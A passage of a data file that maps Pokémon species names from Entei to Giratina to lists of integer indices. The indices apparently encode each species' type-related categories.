72, 73], "entei": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "suicune": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "larvitar": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 25, 32, 53, 55, 77, 78], "pupitar": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 25, 32, 53, 55, 77, 78], "tyranitar": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 50, 51, 52, 101, 102], "lugia": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 26, 27, 61, 79, 80], "ho-oh": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 26, 27, 61, 79, 80], "celebi": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 14, 15, 16, 17, 69, 70, 71], "treecko": [15, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 14, 16, 17, 69, 70, 71], "grovyle": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "sceptile": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "torchic": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "combusken": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 40, 41, 88, 89, 90], "blaziken": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 40, 41, 88, 89, 90], "mudkip": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "marshtomp": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 25, 32, 53, 55, 77, 78], "swampert": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 25, 32, 53, 55, 77, 78], "poochyena": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "mightyena": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "zigzagoon": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "linoone": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "wurmple": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "silcoon": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "beautifly": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "cascoon": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "dustox": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 24, 30, 31, 56, 76], "lotad": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 14, 15, 16, 17, 69, 70, 71], "lombre": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 14, 15, 16, 17, 69, 70, 71], "ludicolo": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 14, 15, 16, 17, 69, 70, 71], "seedot": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "nuzleaf": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 50, 51, 52, 101, 102], "shiftry": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 50, 51, 52, 101, 102], "taillow": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "swellow": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "wingull": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 26, 27, 61, 79, 80], "pelipper": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 26, 27, 61, 79, 80], "ralts": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 46, 47, 96, 97, 98], "kirlia": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 46, 47, 96, 97, 98], "gardevoir": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 46, 47, 96, 97, 98], "surskit": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 10, 11, 12, 13, 63, 68], "masquerain": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "shroomish": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "breloom": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 40, 41, 88, 89, 90], "slakoth": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "vigoroth": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "slaking": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "nincada": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 25, 32, 53, 55, 77, 78], "ninjask": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "shedinja": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 42, 43, 64, 91, 92], "whismur": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "loudred": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "exploud": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "makuhita": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "hariyama": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "azurill": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 46, 47, 96, 97, 98], "nosepass": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "skitty": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "delcatty": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "sableye": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 42, 43, 64, 91, 92], "mawile": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 46, 47, 96, 97, 98], "aron": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 36, 37, 83, 84, 85], "lairon": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 36, 37, 83, 84, 85], "aggron": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 36, 37, 83, 84, 85], "meditite": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 21, 22, 23, 54, 74, 75], "medicham": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 21, 22, 23, 54, 74, 75], "electrike": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "manectric": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "plusle": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "minun": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "volbeat": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "illumise": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "roselia": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "gulpin": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "swalot": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "carvanha": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 50, 51, 52, 101, 102], "sharpedo": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 50, 51, 52, 101, 102], "wailmer": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "wailord": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "numel": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 25, 32, 53, 55, 77, 78], "camerupt": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 25, 32, 53, 55, 77, 78], "torkoal": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "spoink": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "grumpig": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "spinda": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "trapinch": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "vibrava": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 44, 45, 93, 94, 95], "flygon": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 44, 45, 93, 94, 95], "cacnea": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "cacturne": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 50, 51, 52, 101, 102], "swablu": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "altaria": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 26, 27, 61, 79, 80], "zangoose": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "seviper": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "lunatone": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 21, 22, 23, 54, 74, 75], "solrock": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 21, 22, 23, 54, 74, 75], "barboach": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 25, 32, 53, 55, 77, 78], "whiscash": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 25, 32, 53, 55, 77, 78], "corphish": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "crawdaunt": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 50, 51, 52, 101, 102], "baltoy": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 21, 22, 23, 54, 74, 75], "claydol": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 21, 22, 23, 54, 74, 75], "lileep": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 14, 15, 16, 17, 69, 70, 71], "cradily": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 14, 15, 16, 17, 69, 70, 71], "anorith": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 33, 34, 35, 81, 82], "armaldo": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 33, 34, 35, 81, 82], "feebas": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "milotic": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "castform": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "kecleon": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "shuppet": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "banette": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "duskull": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "dusclops": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "tropius": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 26, 27, 61, 79, 80], "chimecho": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "absol": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "wynaut": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "snorunt": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "glalie": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "spheal": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 10, 11, 12, 13, 63, 68], "sealeo": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 10, 11, 12, 13, 63, 68], "walrein": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 10, 11, 12, 13, 63, 68], "clamperl": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "huntail": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "gorebyss": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "relicanth": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 36, 37, 83, 84, 85], "luvdisc": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "bagon": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "shelgon": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "salamence": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 26, 27, 61, 79, 80], "beldum": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 21, 22, 23, 54, 74, 75], "metang": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 21, 22, 23, 54, 74, 75], "metagross": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 21, 22, 23, 54, 74, 75], "regirock": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "regice": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "registeel": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100], "latias": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 21, 22, 23, 54, 74, 75], "latios": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 21, 22, 23, 54, 74, 75], "kyogre": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "groudon": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "rayquaza": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 26, 27, 61, 79, 80], "jirachi": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 21, 22, 23, 54, 74, 75], "deoxys": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "turtwig": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "grotle": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "torterra": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 25, 32, 53, 55, 77, 78], "chimchar": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "monferno": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 40, 41, 88, 89, 90], "infernape": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 40, 41, 88, 89, 90], "piplup": [11, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 10, 12, 13, 63, 68], "prinplup": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "empoleon": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 48, 49, 58, 99, 100], "starly": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "staravia": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "staraptor": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "bidoof": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "bibarel": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 10, 11, 12, 13, 63, 68], "kricketot": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "kricketune": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "shinx": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "luxio": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "luxray": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "budew": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "roserade": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "cranidos": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "rampardos": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "shieldon": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 48, 49, 58, 99, 100], "bastiodon": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 48, 49, 58, 99, 100], "burmy": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "wormadam": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 14, 15, 16, 17, 69, 70, 71], "mothim": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "combee": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "vespiquen": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "pachirisu": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "buizel": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "floatzel": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "cherubi": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "cherrim": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "shellos": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "gastrodon": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 25, 32, 53, 55, 77, 78], "ambipom": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "drifloon": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 26, 27, 61, 79, 80], "drifblim": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 26, 27, 61, 79, 80], "buneary": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "lopunny": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "mismagius": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "honchkrow": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 26, 27, 61, 79, 80], "glameow": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "purugly": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "chingling": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "stunky": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 50, 51, 52, 101, 102], "skuntank": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 50, 51, 52, 101, 102], "bronzor": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 21, 22, 23, 54, 74, 75], "bronzong": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 21, 22, 23, 54, 74, 75], "bonsly": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "mime jr.": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 46, 47, 96, 97, 98], "happiny": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "chatot": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "spiritomb": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 50, 51, 52, 101, 102], "gible": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 25, 32, 53, 55, 77, 78], "gabite": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 25, 32, 53, 55, 77, 78], "garchomp": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 25, 32, 53, 55, 77, 78], "munchlax": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "riolu": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "lucario": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 48, 49, 58, 99, 100], "hippopotas": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "hippowdon": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "skorupi": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 33, 34, 35, 81, 82], "drapion": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 50, 51, 52, 101, 102], "croagunk": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 40, 41, 88, 89, 90], "toxicroak": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 40, 41, 88, 89, 90], "carnivine": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "finneon": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "lumineon": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "mantyke": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 26, 27, 61, 79, 80], "snover": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 38, 39, 57, 86, 87], "abomasnow": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 38, 39, 57, 86, 87], "weavile": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 38, 39, 57, 86, 87], "magnezone": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 48, 49, 58, 99, 100], "lickilicky": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "rhyperior": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 36, 37, 83, 84, 85], "tangrowth": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "electivire": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "magmortar": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "togekiss": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98, 26, 27, 61, 79, 80], "yanmega": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "leafeon": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "glaceon": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "gliscor": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 26, 27, 61, 79, 80], "mamoswine": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 25, 32, 53, 55, 77, 78], "porygon-z": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "gallade": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 40, 41, 88, 89, 90], "probopass": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 48, 49, 58, 99, 100], "dusknoir": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "froslass": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 42, 43, 64, 91, 92], "rotom": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 42, 43, 64, 91, 92], "uxie": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "mesprit": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "azelf": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "dialga": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 44, 45, 93, 94, 95], "palkia": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 44, 45, 93, 94, 95], "heatran": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 48, 49, 58, 99, 100], "regigigas": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "giratina": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 44, 45, 93, 94, 95], 